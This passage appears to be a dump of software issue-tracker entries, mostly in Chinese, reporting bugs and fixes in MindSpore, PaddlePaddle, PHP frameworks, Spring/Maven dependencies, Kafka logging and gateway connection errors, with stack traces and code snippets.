ago. The driver has not received any packets from the server. at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:61) at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:105) at com.mysql.cj.exceptions.ExceptionFactory.createException(ExceptionFactory.java:151) at com.mysql.cj.exceptions.ExceptionFactory.createCommunicationsException(ExceptionFactory.java:167) at com.mysql.cj.protocol.a.NativeSocketConnection.connect(NativeSocketConnection.java:91) at com.mysql.cj.NativeSession.connect(NativeSession.java:144) at com.mysql.cj.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:956) at com.mysql.cj.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:826) ... 22 more Caused by: java.net.ConnectException: Connection timed out (Connection timed out) at java.net.PlainSocketImpl.socketConnect(Native Method) at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350) at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206) at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188) at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392) at java.net.Socket.connect(Socket.java:589) at com.mysql.cj.protocol.StandardSocketFactory.connect(StandardSocketFactory.java:155) at com.mysql.cj.protocol.a.NativeSocketConnection.connect(NativeSocketConnection.java:65) ... 25 more   <code>: ,--. ,--.'| --.' ./ Console: http://172.18.0.3:8848/nacos/index.html ' ' ;. ;.--. .-. | / / '' | |: :| : ;_ | | | \ | \__\/: . .. ' / ' | .; : \ \ ----. \ | | ' --' / ' : | ; : .' \ : : --'---' '---' ---'"
test_check_positive_int1 fails randomly,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run test case test_check_positive_int1 get ValueError: should be an int and must &gt; 0, but got with type .   <code>: 0 int"
[MS][用户接口-MarginRankingLoss]test case has AssertionError on Ascend,"在Ascend平台，调用grad_cmp函数时，绝大多数的用例都有精度问题 / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_nn_marginrankingloss_reduction_default test_nn_marginrankingloss_reduction_sum test_nn_marginrankingloss_reduction_none test_nn_marginrankingloss_input_dtype_float16 test_nn_marginrankingloss_input_dtype_float32 test_nn_marginrankingloss_input_dtype_float64 test_nn_marginrankingloss_input_attribute_margin test_nn_marginrankingloss_1d_float32 test_nn_marginrankingloss_2d_float32 test_nn_marginrankingloss_3d_float16 test_nn_marginrankingloss_4d_float16 test_nn_marginrankingloss_5d_float32 test_nn_marginrankingloss_6d_float16 test_nn_marginrankingloss_7d_float16 def test_nn_marginrankingloss_reduction_default(): logits1 = Tensor(np.random.randn(2, 2).astype(np.float32)) logits2 = Tensor(np.random.randn(2, 2).astype(np.float32)) labels = Tensor((np.random.randint(2, size=(2, 2)) * 2 - 1).astype(np.float32)) input_list = [logits1, logits2, labels] fact = MarginRankingLossMock(inputs=input_list) fact.forward_cmp() test_nn_marginrankingloss.py:30: ../share/ops/nn/marginrankingloss_ops.py:68: in grad_cmp allclose_nparray(data_expected, data_me, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) data_expected = array([[0. , 0.07458219], [0.07458219, 0. ]], dtype=float32) data_me = array([[0., 0.], [0., 0.]], dtype=float32), rtol = 0.001, atol = 0.001 E AssertionError: E data_expected_std:[0.07458219 0.07458219] E data_me_error:[0. 0.] E loss:[0.07458219 0.07458219] ../share/utils.py:24: AssertionError _________________________________________________________ test_nn_marginrankingloss_2d_float32 ___________________________________________________________ def test_nn_marginrankingloss_2d_float32(): logits1 = Tensor(np.random.randn(2, 2).astype(np.float32)) logits2 = Tensor(np.random.randn(2, 2).astype(np.float32)) labels = Tensor((np.random.randint(2, size=(2, 2)) * 2 - 1).astype(np.float32)) input_list = [logits1, logits2, labels] fact = MarginRankingLossMock(inputs=input_list) fact.forward_cmp() test_nn_marginrankingloss.py:208: ../share/ops/nn/marginrankingloss_ops.py:68: in grad_cmp allclose_nparray(data_expected, data_me, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) data_expected = array([[ 0.04290303, -0.04290303], [ 0.04290303, 0.04290303]], dtype=float32) data_me = array([[0., 0.], [0., 0.]], dtype=float32), rtol = 0.001, atol = 0.001 E AssertionError: E data_expected_std:[ 0.04290303 -0.04290303 0.04290303 0.04290303] E data_me_error:[0. 0. 0. 0.] E loss:[0.04290303 0.04290303 0.04290303 0.04290303] ../share/utils.py:24: AssertionError 3. all pass   <code>: fact.grad_cmp() def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ format(data_expected[greater], data_me[greater], error[greater]) fact.grad_cmp() def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ format(data_expected[greater], data_me[greater], error[greater])"
v1.0版本在php7.1下手机端无法授权获取用户信息,"修改：/framework/class/wesession.class.php 参考资料：http://php.net/manual/vote-note.php?id=120589&amp;page=function.session-start&amp;vote=down   <code>: public function read($sessionid) { $sql = 'SELECT * FROM ' . tablename('core_sessions') . ' WHERE `sid`=:sessid AND `expiretime`&gt;:time'; $params = array(); $params[':sessid'] = $sessionid; $params[':time'] = TIMESTAMP; $row = pdo_fetch($sql, $params); if(is_array($row) &amp;&amp; !empty($row['data'])) { return $row['data']; } return ''; // false 需要改为 '' }"
组合数组多选更新报错,"文件位置 /app/admin/controller/setting/SystemGroupData.php 错误代码： 正确代码：   <code>: /** * 保存更新的资源 * * @param $id */ public function update($id) { $GroupData = GroupDataModel::get($id); $group = GroupModel::where('id', $GroupData['gid'])-&gt;find(); if (!$GroupData || !$group) { return Json::fail('请检查配置'); } $params = request()-&gt;post(); //秒杀 if ($group['config_name'] == 'routine_seckill_time') { if ($params['time'] == '') { return Json::fail('请输入开始时间'); } if (!$params['continued']) { return Json::fail('请输入持续时间'); } if (!preg_match('/^(\d|1\d|2[0-3])$/', $params['time'])) { return Json::fail('请输入0-23点之前的整点数'); } if (!preg_match('/^([1-9]|1\d|2[0-4])$/', $params['continued'])) { return Json::fail('请输入1-24点之前的持续时间'); } if (($params['time'] + $params['continued']) &gt; 24) { return Json::fail('开始时间+持续时间不能大于24小时'); } $list = GroupDataModel::where('gid', $GroupData['gid'])-&gt;column('value', 'id'); $times = $time = []; if ($id) unset($list[$id]); foreach ($list as $item) { $info = json_decode($item, true); for ($i = 0; $i &lt; $info['continued']['value']; $i++) { $times[] = $info['time']['value'] + $i; } } for ($i = 0; $i &lt; $params['continued']; $i++) { $time[] = $params['time'] + $i; } foreach ($time as $v) { if (in_array($v, $times)) return Json::fail('时段已占用'); } } $Fields = json_decode($group['fields'], true) ?? []; foreach ($params as $key =&gt; $param) { foreach ($Fields as $index =&gt; $field) { if ($key == $field[""title""]) { if (is_array($param) &amp;&amp; count($param) == 0 || !is_array($param) &amp;&amp; trim($param) == '') return Json::fail($field[""name""] . ""不能为空！""); else { $value[$key][""type""] = $field[""type""]; $value[$key][""value""] = $param; } } } } $data = array(""value"" =&gt; htmlspecialchars_decode(json_encode($value)), ""sort"" =&gt; $params[""sort""], ""status"" =&gt; $params[""status""]); GroupDataModel::edit($data, $id); CacheService::clear(); return Json::successful('修改成功!'); } /** * 保存更新的资源 * * @param $id */ public function update($id) { $GroupData = GroupDataModel::get($id); $group = GroupModel::where('id', $GroupData['gid'])-&gt;find(); if (!$GroupData || !$group) { return Json::fail('请检查配置'); } $params = request()-&gt;post(); //秒杀 if ($group['config_name'] == 'routine_seckill_time') { if ($params['time'] == '') { return Json::fail('请输入开始时间'); } if (!$params['continued']) { return Json::fail('请输入持续时间'); } if (!preg_match('/^(\d|1\d|2[0-3])$/', $params['time'])) { return Json::fail('请输入0-23点之前的整点数'); } if (!preg_match('/^([1-9]|1\d|2[0-4])$/', $params['continued'])) { return Json::fail('请输入1-24点之前的持续时间'); } if (($params['time'] + $params['continued']) &gt; 24) { return Json::fail('开始时间+持续时间不能大于24小时'); } $list = GroupDataModel::where('gid', $GroupData['gid'])-&gt;column('value', 'id'); $times = $time = []; if ($id) unset($list[$id]); foreach ($list as $item) { $info = json_decode($item, true); for ($i = 0; $i &lt; $info['continued']['value']; $i++) { $times[] = $info['time']['value'] + $i; } } for ($i = 0; $i &lt; $params['continued']; $i++) { $time[] = $params['time'] + $i; } foreach ($time as $v) { if (in_array($v, $times)) return Json::fail('时段已占用'); } } $Fields = json_decode($group['fields'], true) ?? []; foreach ($params as $key =&gt; $param) { foreach ($Fields as $index =&gt; $field) { if ($key == $field[""title""]) { if (is_array($param) &amp;&amp; count($param) == 0 || !is_array($param) &amp;&amp; trim($param) == '') return Json::fail($field[""name""] . ""不能为空！""); else { $value[$key][""type""] = $field[""type""]; $value[$key][""value""] = $param; } } } } $data = array(""value"" =&gt; htmlspecialchars_decode(json_encode($value)), ""sort"" =&gt; $params[""sort""], ""status"" =&gt; $params[""status""]); GroupDataModel::edit($data, $id); CacheService::clear(); return Json::successful('修改成功!'); }"
集成2.3.7的logging，jenkins打的包缺少依赖,问题比较神奇 初始pom如下 本地使用idea本地build，启动调试都没有问题 但是放到jenkins上打包，执行就报找不到类 后来手动找到缺的包加到依赖中才行 加了下面这四个   <code>: &lt;api.boot.version&gt;2.3.7&lt;/api.boot.version&gt; &lt;dependency&gt; &lt;groupId&gt;org.minbox.framework&lt;/groupId&gt; &lt;artifactId&gt;api-boot-starter-logging&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependencyManagement&gt; &lt;!--ApiBoot统一版本依赖 @EnableLoggingClient等使用--&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.minbox.framework&lt;/groupId&gt; &lt;artifactId&gt;api-boot-dependencies&lt;/artifactId&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;version&gt;${api.boot.version}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/dependencyManagement&gt; &lt;dependency&gt; &lt;groupId&gt;org.minbox.framework&lt;/groupId&gt; &lt;artifactId&gt;minbox-logging-client&lt;/artifactId&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.minbox.framework&lt;/groupId&gt; &lt;artifactId&gt;minbox-logging-core&lt;/artifactId&gt; &lt;version&gt;1.0.6&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.minbox.framework&lt;/groupId&gt; &lt;artifactId&gt;minbox-sequence&lt;/artifactId&gt; &lt;version&gt;1.0.0.RELEASE&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;transmittable-thread-local&lt;/artifactId&gt; &lt;version&gt;2.12.6&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt;
若依网关频繁出现Connection reset by peer错误,"各位大佬，我部署了一套若依的代码到服务器上，但是经常性出现[网关异常处理]，IP这边不方便透露，已经用0.0.0.0替代，错误日志如下： 排查了许久，一直没找到原因，大佬们，是啥原因啊 JDK版本   <code>: 14:42:51.225 [reactor-http-epoll-3] WARN r.n.h.c.HttpClientConnect - [warn,295] - [id:1898a3e9-4, L:/0.0.0.0:52880 - R:0.0.0.0/0.0.0.0:9201] The connection observed an error, the request cannot be retried as the headers/body were sent io.netty.channel.unix.Errors$NativeIoException: readAddress(..) failed: Connection reset by peer 14:42:51.226 [reactor-http-epoll-3] ERROR c.r.g.h.GatewayExceptionHandler - [handle,52] - [网关异常处理]请求路径:/system/user/list,异常信息:readAddress(..) failed: Connection reset by peer 14:42:54.207 [reactor-http-epoll-4] WARN r.n.h.c.HttpClientConnect - [warn,295] - [id:ecf70b67-1, L:/0.0.0.0:52912 - R:0.0.0.0/0.0.0.0:9201] The connection observed an error, the request cannot be retried as the headers/body were sent io.netty.channel.unix.Errors$NativeIoException: readAddress(..) failed: Connection reset by peer 14:42:54.208 [reactor-http-epoll-4] ERROR c.r.g.h.GatewayExceptionHandler - [handle,52] - [网关异常处理]请求路径:/system/user/list,异常信息:readAddress(..) failed: Connection reset by peer 14:43:46.722 [reactor-http-epoll-4] WARN r.n.h.c.HttpClientConnect - [warn,295] - [id:804ddea5-2, L:/0.0.0.0:52968 - R:0.0.0.0/0.0.0.0:9201] The connection observed an error, the request cannot be retried as the headers/body were sent io.netty.channel.unix.Errors$NativeIoException: readAddress(..) failed: Connection reset by peer 14:43:46.723 [reactor-http-epoll-4] ERROR c.r.g.h.GatewayExceptionHandler - [handle,52] - [网关异常处理]请求路径:/system/user/staff/list,异常信息:readAddress(..) failed: Connection reset by peer 14:43:46.727 [reactor-http-epoll-1] WARN r.n.h.c.HttpClientConnect - [warn,295] - [id:8ccf0d11-2, L:/0.0.0.0:52970 - R:0.0.0.0/0.0.0.0:9201] The connection observed an error, the request cannot be retried as the headers/body were sent io.netty.channel.unix.Errors$NativeIoException: readAddress(..) failed: Connection reset by peer 14:43:46.728 [reactor-http-epoll-1] ERROR c.r.g.h.GatewayExceptionHandler - [handle,52] - [网关异常处理]请求路径:/system/dict/data/type/sys_user_sex,异常信息:readAddress(..) failed: Connection reset by peer 14:51:47.467 [reactor-http-epoll-1] ERROR c.r.g.h.GatewayExceptionHandler - [handle,52] - [网关异常处理]请求路径:/,异常信息:404 NOT_FOUND openjdk version ""1.8.0_312"" OpenJDK Runtime Environment (build 1.8.0_312-b07) OpenJDK 64-Bit Server VM (build 25.312-b07, mixed mode)"
建议增加Request.Body的重复读取特性,"当特殊情况，需要手动获取Request.Body中的数据（例如要重新获取微信推送过来的Xml信息） 直接读取Request.Body是无法实现的，原因可能是.netcore默认Body只能读取一次。 相关代码 根据相关文档，需要开启重读属性，比如： 1、在ConfigureServices配置： services.Configure(options =&gt; { options.AllowSynchronousIO = true; }); 2、在Configure(IApplicationBuilder app, IWebHostEnvironment env)配置 app.Use(next =&gt; context =&gt; { context.Request.EnableBuffering(); return next(context); }); 3、然后在需要读取Body的地方： Request.EnableBuffering(); var stream = Request.Body; long? length = Request.ContentLength; if (length != null &amp;&amp; length &gt; 0) { StreamReader streamReader = new StreamReader(stream, Encoding.UTF8); result = streamReader.ReadToEndAsync().Result; } Request.Body.Position = 0; 我建议把第1步和第2步放入UseInject里面，把第3步写成拓展： 这样子的话，开发时候只需要Request.BodyString就能获取。   <code>: public static string BodyString(this HttpRequest Request) { string result = string.Empty; try { Request.EnableBuffering(); var stream = Request.Body; long? length = Request.ContentLength; if (length != null &amp;&amp; length &gt; 0) { StreamReader streamReader = new StreamReader(stream, Encoding.UTF8); result = streamReader.ReadToEndAsync().Result; } Request.Body.Position = 0; } catch (Exception) { } return result; }"
JSONQuery注解,"用JSONQuery注解修饰的参数表示该参数会被以JSON格式转换成url中Query参数 如以上代码调用为： 产生的请求url为： http://localhost:8080/send?id_list=[1,2,3,4,5]&amp;u={""username"":""foo"",""password"":""bar""}   <code>: @Get(""http://localhost:8080/send"") String send(@JSONQuery(""id_list"") List&lt;Integer&gt; idList, @JSONQuery(""u"") User user); List&lt;Integer&gt; idList = Lists.newArrayList(1, 2, 3, 4, 5); User user = new User(); user.setUsername(""foo""); user.setPassword(""bar""); client.send(idList, user);"
在使用kafka做队列时，如何修改默认的zookeeper注册中心地址(localhost:2181)呢?,"在使用kafka做消息队列时，设置为如下： 在启动时，发现warn: 2020-07-21 14:15:29.571 WARN 13200 --- [ad | producer-1] org.apache.kafka.clients.NetworkClient : [Producer clientId=producer-1] Error connecting to node DESKTOP-HOS9DR7:9092 (id: 1 rack: null) java.net.UnknownHostException: DESKTOP-HOS9DR7 at java.net.InetAddress.getAllByName0(InetAddress.java:1281) at java.net.InetAddress.getAllByName(InetAddress.java:1193) at java.net.InetAddress.getAllByName(InetAddress.java:1127) at org.apache.kafka.clients.ClientUtils.resolve(ClientUtils.java:104) at org.apache.kafka.clients.ClusterConnectionStates$NodeConnectionState.currentAddress(ClusterConnectionStates.java:403) at org.apache.kafka.clients.ClusterConnectionStates$NodeConnectionState.access$200(ClusterConnectionStates.java:363) at org.apache.kafka.clients.ClusterConnectionStates.currentAddress(ClusterConnectionStates.java:151) at org.apache.kafka.clients.NetworkClient.initiateConnect(NetworkClient.java:943) at org.apache.kafka.clients.NetworkClient.ready(NetworkClient.java:288) at org.apache.kafka.clients.producer.internals.Sender.sendProducerData(Sender.java:361) at org.apache.kafka.clients.producer.internals.Sender.runOnce(Sender.java:334) at org.apache.kafka.clients.producer.internals.Sender.run(Sender.java:244) at java.lang.Thread.run(Thread.java:748) 其原因是，连接了本地的zookeeper，而不是kafka集群中zookeeper，导致无法找到Host地址 2020-07-21 14:15:27.390 INFO 13200 --- [localhost:2181)] org.apache.zookeeper.ClientCnxn : Opening socket connection to server localhost/0:0:0:0:0:0:0:1:2181. Will not attempt to authenticate using SASL (unknown error) 在启动了zookeeper的集群的环境中发现，没有这个问题。请问如何修改，kafka提供的默认zookeeper注册地址   <code>: &lt;appender name=""PLUME_LOG"" class=""com.plumelog.logback.appender.KafkaAppender""&gt; &lt;appName&gt;plumelog&lt;/appName&gt; &lt;kafkaHosts&gt;10.80.135.221:9092,10.80.135.222:9092,10.80.135.223:9092&lt;/kafkaHosts&gt; &lt;runModel&gt;1&lt;/runModel&gt; &lt;/appender&gt;"
[CI][MS][doc] Example for Cross is failed,"mindspore.ops.operations.math_ops.Cross 预期结果中，多逗号。 / 硬件环境: /device ascend /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph   <code>: ____________________________________________________ [doctest] mindspore.ops.operations.math_ops.Cross _____________________________________________________ 6110 &gt;&gt;&gt; import mindspore 6111 &gt;&gt;&gt; import numpy as np 6112 &gt;&gt;&gt; from mindspore import Tensor 6113 &gt;&gt;&gt; from mindspore.common import dtype as mstype 6114 &gt;&gt;&gt; import mindspore.ops as ops 6115 &gt;&gt;&gt; cross = ops.Cross(dim = 0) 6116 &gt;&gt;&gt; x1 = Tensor([1, 2, 3], mstype.int8) 6117 &gt;&gt;&gt; x2 = Tensor([1, 2, 3], mstype.int8) 6118 &gt;&gt;&gt; output = cross(x1, x2) 6119 &gt;&gt;&gt; print(output) Expected: [0, 0, 0] Got: [0 0 0]"
2.9.4 SpringBoot版本，缺少QLExpress依赖,SpringBoot 2.7 liteflow 2.9.4 引入依赖项目启动报错 java.lang.NoClassDefFoundError: com/ql/util/express/exception/QLException 需要同时引入   <code>: &lt;dependency&gt; &lt;groupId&gt;com.yomahub&lt;/groupId&gt; &lt;artifactId&gt;liteflow-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.9.4&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;QLExpress&lt;/artifactId&gt; &lt;version&gt;3.3.0&lt;/version&gt; &lt;/dependency&gt;
fix nccl version,"fix #8536:/paddle/paddle/fluid/framework/dim.h(188): warning: statement is unreachable Please refer to https://docs.nvidia.com/deeplearning/sdk/pdf/NCCL-Installation-Guide.pdf. If we install nccl as following: 2.1.4-1+cuda9.1 version will be installed. However, our docker environment is cuda 8.0. We must install right version of nccl I have test the nccl_test after installing the right version of nccl. It's good.   <code>: sudo apt-get install libnccl2 libnccl-dev sudo apt-get install libnccl2=2.1.2-1+cuda8.0 libnccl-dev=2.1.2-1+cuda8.0"
自定义api脚本加密 启动报错,"自定义api脚本加密 ，启动时报错 我的代码：`public class CustomApiServiceProvider extends ApiServiceProvider { private StringEncryptor encryptor; // this. encryptor = encryptor; } } ` 在 类 StoreServiceProvider 41行 报错截图：   <code>: public CustomApiServiceProvider(Resource workspace, GroupServiceProvider groupServiceProvider,StringEncryptor encryptor) { super(workspace, groupServiceProvider); this. encryptor = encryptor; } public CustomApiServiceProvider(Resource workspace, GroupServiceProvider groupServiceProvider) { super(workspace, groupServiceProvider); @Override public void unwrap(ApiInfo info) { String script = info.getScript(); // 自行将script解密处理 if(Objects.nonNull(encryptor)){ script = encryptor.decrypt(script); } info.setScript(script); } @Override public void wrap(ApiInfo info) { String script = info.getScript(); // 自行将script加密处理 if(Objects.nonNull(encryptor)){ script = encryptor.encrypt(script); } info.setScript(script); }"
python api训练过程报错,"按照demo修改数据集和验证集： demo源码路径：https://github.com/PaddlePaddle/models/blob/develop/image_classification/ 错误：   <code>: [INFO 2017-08-08 19:47:42,445 layers.py:2255] output for __conv_0__: c = 96, h = 54, w = 54, size = 279936 [INFO 2017-08-08 19:47:42,447 layers.py:2380] output for __pool_0__: c = 96, h = 27, w = 27, size = 69984 [INFO 2017-08-08 19:47:42,448 layers.py:2255] output for __conv_1__: c = 256, h = 27, w = 27, size = 186624 [INFO 2017-08-08 19:47:42,450 layers.py:2380] output for __pool_1__: c = 256, h = 13, w = 13, size = 43264 [INFO 2017-08-08 19:47:42,451 layers.py:2255] output for __conv_2__: c = 384, h = 13, w = 13, size = 64896 [INFO 2017-08-08 19:47:42,453 layers.py:2255] output for __conv_3__: c = 384, h = 13, w = 13, size = 64896 [INFO 2017-08-08 19:47:42,454 layers.py:2255] output for __conv_4__: c = 256, h = 13, w = 13, size = 43264 [INFO 2017-08-08 19:47:42,455 layers.py:2380] output for __pool_2__: c = 256, h = 6, w = 6, size = 9216 I0808 19:47:42.893196 18189 GradientMachine.cpp:85] Initing parameters.. I0808 19:47:48.673799 18189 GradientMachine.cpp:92] Init parameters done. Pass 0, Batch 0, Cost 19.511793, {'classification_error_evaluator': 0.9921875} Pass 0, Batch 1, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 2, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 3, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 4, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 5, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 6, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 7, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 8, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 9, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 10, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 11, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 12, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 13, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 14, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 15, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 16, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 17, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 18, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 19, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 20, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 21, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 22, Cost 0.000000, {'classification_error_evaluator': 0.0} Pass 0, Batch 23, Cost 10.500000, {'classification_error_evaluator': 0.1640625} Pass 0, Batch 24, Cost 41.500000, {'classification_error_evaluator': 0.6484375} Pass 0, Batch 25, Cost 22.000000, {'classification_error_evaluator': 0.34375} Thread [140078791661312] Forwarding __fc_layer_1__, *** Aborted at 1502194420 (unix time) try ""date -d @1502194420"" if you are using GNU date *** PC: @ 0x0 (unknown) *** SIGFPE (@0x7f669a15806f) received by PID 18189 (TID 0x7f66a29e1700) from PID 18446744071999684719; stack trace: *** @ 0x7f66a25b8160 (unknown) @ 0x7f669a15806f mkl_blas_avx_sgemm_kernel_0"
不支持纯数字的数据库字段,"使用查询构造器Db.table($tableName)-&gt;insert和insertAll时，如果数据库中有纯数字的字段（比如2022），此时insert或insertAll的参数data的key也存在该字段，例如这样的数据： 在入库时，文件vendor/topthink/think-orm/src/db/Builder.php的第158行这里的逻辑会出现错误。 逻辑分析： 如果数组的key是个数字，在vendor/topthink/think-orm/src/db/Builder.php的第149行，调用将该key转为字符串形式的$item，但是紧接着并没有使用这个$item变量，而是在158行调用strpos时传入了$key（这是数字类型），所以会抛出异常，导致数据入库失败   <code>: [ '2022' =&gt; 1, 'name' =&gt; 'my name' ] $item = $this-&gt;parseKey($query, $key, true)"
两点修正,"1.project.html，第2778行“if(node.state &amp;&amp; (node.state | 0b00000010) != 0) //只显示文件编辑锁定 ”中的“0b00000010”应改为“0x00000010” 2.docsys.js，第2024行，“let docIframe = $(""."" + ArtDialogId).find(""iframe[name=${ArtDialogId}]"")[0];”中的“”应改为“""iframe[name=${ArtDialogId}]""”   <code>: iframe[name=${ArtDialogId}]"
update_date字段排序问题,"1.新建单表 CREATE TABLE ( bigint(20) unsigned NOT NULL AUTO_INCREMENT, varchar(100) DEFAULT NULL COMMENT '模板名称', text COMMENT '模板内容', tinyint(1) DEFAULT '0' COMMENT '模板类型：0:文本 1:图片 2;语音 3:视频', varchar(128) DEFAULT NULL COMMENT '模板地址', int(11) DEFAULT NULL COMMENT '公众号id,wx_config表的id', varchar(64) DEFAULT NULL COMMENT '公众号原始id', varchar(64) DEFAULT NULL COMMENT '创建人名称', datetime DEFAULT NULL COMMENT '创建时间', varchar(64) DEFAULT NULL COMMENT '修改人名称', datetime DEFAULT NULL COMMENT '更新时间', PRIMARY KEY () ) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=utf8 COMMENT='微信模板'; 2.生成前后端页面代码 3.配置对应权限 4.浏览器访问http://localhost:8080/index.html#modules/wx/wxtemplate.html 5.点击 2.updateDate字段排序操作时，后台只是selectCount并没有执行selectPage   <code>: wx_template id name content type url wx_id origin_id create_name create_date update_name update_date id"
len(CellList) has error in graph mode,"len(CellList) has error in graph mode   <code>: from mindspore import nn import mindspore class Net(nn.Cell): def __init__(self): super(Net, self).__init__() self.scaleLayers = nn.CellList() def addScale(self): self.scaleLayers.append(nn.CellList()) def construct(self): s =0 for i in self.scaleLayers: s+=1 return s mindspore.context.set_context(mode=mindspore.context.GRAPH_MODE,device_target=""Ascend"",device_id=4) gnet = Net() out= gnet() assert out ==0 gnet.addScale() out= gnet() assert out ==1"
op lookup_table does not have kernel for data_type[::paddle::platform::float16],PaddlePaddle版本：1.5 CPU 系统环境：Ubuntu1604 Python版本号: 3.7 复现信息：把paddle官方的ERNIE模型cast成半精度的版本（加-fp16选项）然后保存inference_model 问题描述： 虽然我也不知道哪里用到了lookup_table，请问lookup_table op目前不支持fp16吗？我把paddle官方的ERNIE模型存成半精度的inference_model时报了下面的错：   <code>: op lookup_table does not have kernel for data_type[::paddle::platform::float16]...
paddle.fft.rfft的计算结果跟numpy的不一样,"PaddlePaddle develop（pip） 使用计算的结果跟numpy的计算结果输出的shape都不一样的，应该是作用axis不一样，但是改了axis也不起效果。   <code>: paddle.fft.rfft np.fft.rfft import numpy as np x = np.random.random((320, 838)) print(x.shape) # (320, 838) fft = np.fft.rfft(x, n=None, axis=0) print(fft.shape) # (161, 838) import paddle import numpy as np x = np.random.random((320, 838)) x = paddle.to_tensor(x) print(x.shape) # [320, 838] fft = paddle.fft.rfft(x, n=None, axis=0) print(fft.shape) # [320, 420]"
message cxx compiler version,fix #6384:Format error The print result is   <code>: -- CXX compiler version:4.8.3
调用$.i18n.prop方法失败,"已经在i18n文件中添加了 在user.html中使用   <code>: userId=用户ID //获取应用路径 var ROOT = [[${#servletContext.contextPath}]]; //获取默认语言 var LANG_COUNTRY = [[${#locale.language+'_'+#locale.country}]]; //初始化i18n插件 $.i18n.properties({ path: ROOT + '/i18n/',//这里表示访问路径 name: 'messages',//文件名开头 language: LANG_COUNTRY,//文件名语言 例如en_US mode: 'map'//默认值 }); //初始化i18n函数 function i18n(msgKey) { try { return $.i18n.prop(msgKey); } catch (e) { return msgKey; } }"
v2 optimizer API arguments lack document,"in our current stage of document. V2 optimizer API only port some part of V1 document. The common parameter settings in V1 is missing. optimizer V2 optimizer V1 e.g. , in V1 settting config is missing in V2.   <code>: learning_rate L2Regularization"
在不去重场景下的问题,"如有Page没有配置成isUnique=""1""，会出现页面无限递归download的严重问题： 这时候如果不去重复，则会出现三个页面之间循环download的问题！   <code>: A 页面里存在 B, C 两个页面 B 页面存在 A, C 页面 C页面存在 A, B 页面"
